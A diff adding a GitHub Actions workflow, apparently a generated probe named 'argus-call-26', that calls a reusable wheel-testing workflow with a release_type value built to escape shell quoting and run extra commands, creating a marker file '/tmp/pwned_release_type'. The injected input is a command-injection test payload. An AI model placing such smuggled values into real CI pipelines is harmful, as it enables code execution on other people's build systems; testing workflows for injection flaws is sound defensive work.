@@ -1,0 +1,9 @@
+name: argus-call-26
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/test-whl.yaml
+    with:
+      release_type: "x\"; touch /tmp/pwned_release_type; ls; exit 1; #"
+      wheel_names: "x"
